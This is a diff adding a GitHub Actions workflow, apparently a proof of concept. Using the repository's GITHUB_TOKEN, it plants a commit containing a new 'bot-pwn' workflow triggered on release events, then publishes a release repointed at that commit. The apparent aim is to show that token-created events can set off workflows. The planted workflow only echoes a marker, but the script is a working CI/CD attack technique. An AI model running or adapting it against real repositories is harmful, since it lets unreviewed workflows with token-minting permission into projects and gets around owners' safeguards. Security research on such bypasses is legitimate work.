@@ -1,0 +1,64 @@
+name: planter
+on:
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: random suffix
+        required: false
+        default: 'auto'
+permissions:
+  contents: write
+jobs:
+  plant:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Plant orphan + PATCH-publish via GITHUB_TOKEN
+        env:
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          api(){
+            local m="$1" p="$2" b="${3:-}"
+            if [ -n "$b" ]; then
+              curl -sS -X "$m" -H "Authorization: Bearer $TOKEN" \
+                -H "Accept: application/vnd.github+json" \
+                -H "X-GitHub-Api-Version: 2022-11-28" \
+                -H "Content-Type: application/json" --data "$b" \
+                "https://api.github.com$p"
+            else
+              curl -sS -X "$m" -H "Authorization: Bearer $TOKEN" \
+                -H "Accept: application/vnd.github+json" \
+                -H "X-GitHub-Api-Version: 2022-11-28" \
+                "https://api.github.com$p"
+            fi
+          }
+
+          RAND=$(openssl rand -hex 4)
+          MAIN_SHA=$(api GET "/repos/$REPO/git/refs/heads/main" | jq -r .object.sha)
+          MAIN_TREE=$(api GET "/repos/$REPO/git/commits/$MAIN_SHA" | jq -r .tree.sha)
+          DOTGH=$(api GET "/repos/$REPO/git/trees/$MAIN_TREE" | jq -r '.tree[]|select(.path==".github")|.sha')
+          WFTREE=$(api GET "/repos/$REPO/git/trees/$DOTGH" | jq -r '.tree[]|select(.path=="workflows")|.sha')
+
+          YAML="name: bot-pwn-$RAND
+          on: { release: { types: [published, edited, released] } }
+          permissions: { contents: read, id-token: write }
+          jobs:
+            fire:
+              runs-on: ubuntu-latest
+              steps:
+                - run: echo \"BOT_PWN_$RAND action=\${{ github.event.action }} actor=\${{ github.triggering_actor }} via_GHTOKEN=true\""
+
+          BLOB=$(api POST "/repos/$REPO/git/blobs" "$(jq -nc --arg c "$YAML" '{content:$c, encoding:"utf-8"}')" | jq -r .sha)
+          NEWWF=$(api POST "/repos/$REPO/git/trees" "$(jq -nc --arg t "$WFTREE" --arg fn "bot-pwn-$RAND.yml" --arg s "$BLOB" '{base_tree:$t, tree:[{path:$fn, mode:"100644", type:"blob", sha:$s}]}')" | jq -r .sha)
+          NEWGH=$(api POST "/repos/$REPO/git/trees" "$(jq -nc --arg t "$DOTGH" --arg s "$NEWWF" '{base_tree:$t, tree:[{path:"workflows", mode:"040000", type:"tree", sha:$s}]}')" | jq -r .sha)
+          NEWTOP=$(api POST "/repos/$REPO/git/trees" "$(jq -nc --arg t "$MAIN_TREE" --arg s "$NEWGH" '{base_tree:$t, tree:[{path:".github", mode:"040000", type:"tree", sha:$s}]}')" | jq -r .sha)
+          SHA=$(api POST "/repos/$REPO/git/commits" "$(jq -nc --arg t "$NEWTOP" --arg p "$MAIN_SHA" --arg m "bot-plant $RAND" '{tree:$t, parents:[$p], message:$m}')" | jq -r .sha)
+          echo "ORPHAN_SHA=$SHA"
+          echo "RAND=$RAND"
+
+          TAG="bot-$RAND"
+          RID=$(api POST "/repos/$REPO/releases" "$(jq -nc --arg t "$TAG" '{tag_name:$t, target_commitish:"main", draft:true}')" | jq -r .id)
+          api PATCH "/repos/$REPO/releases/$RID" "$(jq -nc --arg s "$SHA" '{target_commitish:$s}')" >/dev/null
+          api PATCH "/repos/$REPO/releases/$RID" '{"draft":false}' >/dev/null
+          echo "PUBLISHED RID=$RID via GITHUB_TOKEN"
